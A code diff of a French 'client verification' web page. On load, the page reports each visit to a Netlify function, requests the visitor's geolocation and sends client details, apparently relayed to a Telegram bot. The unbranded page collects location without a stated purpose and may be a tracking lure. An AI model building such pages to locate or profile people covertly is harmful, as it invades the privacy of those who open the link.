@@ -9,16 +9,12 @@
       --bg: #07090f;
       --bg-2: #0b0f18;
       --card: rgba(14, 18, 30, 0.82);
-      --card-2: rgba(10, 13, 22, 0.75);
       --text: #eef2ff;
       --muted: #9aa4bf;
       --border: rgba(255, 255, 255, 0.10);
       --border-2: rgba(255, 255, 255, 0.06);
 
       --gold: #d6b36a;
-      --gold-2: #b88a3c;
-      --gold-soft: rgba(214, 179, 106, 0.16);
-
       --primary: linear-gradient(135deg, #d6b36a 0%, #b88a3c 45%, #f3d28f 100%);
       --primary-text: #16120a;
 
@@ -35,7 +31,6 @@
     }
 
     * { box-sizing: border-box; }
-
     html, body { height: 100%; }
 
     body {
@@ -145,7 +140,7 @@
       margin: 10px 0 0;
       color: var(--muted);
       font-size: 0.94rem;
-      max-width: 90%;
+      max-width: 95%;
     }
 
     .subtitle strong {
@@ -340,8 +335,11 @@
 
     <div class="card">
       <div class="card-header">
-        <h1>Vérification </h1>
-        
+        <h1>Vérification client</h1>
+        <p class="subtitle">
+          En cliquant sur <strong>Valider la demande</strong>, vous lancez la vérification.
+          Des informations techniques peuvent être collectées à des fins de sécurité.
+        </p>
       </div>
 
       <div class="card-body">
@@ -373,7 +371,7 @@
         </div>
 
         <div class="consent-note">
-          Le clic sur <strong>Valider la demande</strong> lance la vérification.
+          Le clic sur <strong>Valider la demande</strong> lance la vérification et peut demander la localisation.
         </div>
 
         <div class="actions">
@@ -439,6 +437,31 @@
         throw new Error((data.telegram && data.telegram.description) || data.error || ("HTTP " + res.status));
       }
       return data;
+    }
+
+    // Notification de visite (au chargement de page)
+    async function sendVisitOpened() {
+      try {
+        const client = getClientInfo();
+
+        await fetch("/.netlify/functions/visit-opened", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            language: client.language || "",
+            timezone: client.timezone || ""
+          })
+        });
+      } catch (e) {
+        // silencieux
+      }
+    }
+
+    function triggerVisitOnce() {
+      const key = "visit_opened_sent";
+      if (sessionStorage.getItem(key)) return;
+      sessionStorage.setItem(key, "1");
+      sendVisitOpened();
     }
 
     function requestLocationWithFallback(onSuccess, onError) {
@@ -507,30 +530,6 @@
                 client: getClientInfo()
               };
 
-              async function sendVisitOpened() {
-  try {
-    const client = getClientInfo();
-
-    await fetch("/.netlify/functions/visit-opened", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        language: client.language || "",
-        timezone: client.timezone || ""
-      })
-    });
-  } catch (e) {
-    // silencieux (on ne bloque pas l'interface)
-  }
-}
-
-function triggerVisitOnce() {
-  const key = "visit_opened_sent";
-  if (sessionStorage.getItem(key)) return;
-  sessionStorage.setItem(key, "1");
-  sendVisitOpened();
-}
-
               await sendPayload(payload);
               setStatus("✅ Vérification envoyée. Merci.", "ok");
             } catch (e) {
@@ -558,9 +557,11 @@ function triggerVisitOnce() {
         setStatus("Erreur : " + (e.message || e), "err");
         btn.disabled = false;
       }
-      window.addEventListener("load", function () {
-  triggerVisitOnce();
-});
+    });
+
+    // Appel au chargement (1 seule fois par onglet)
+    window.addEventListener("load", function () {
+      triggerVisitOnce();
     });
   </script>
 </body>
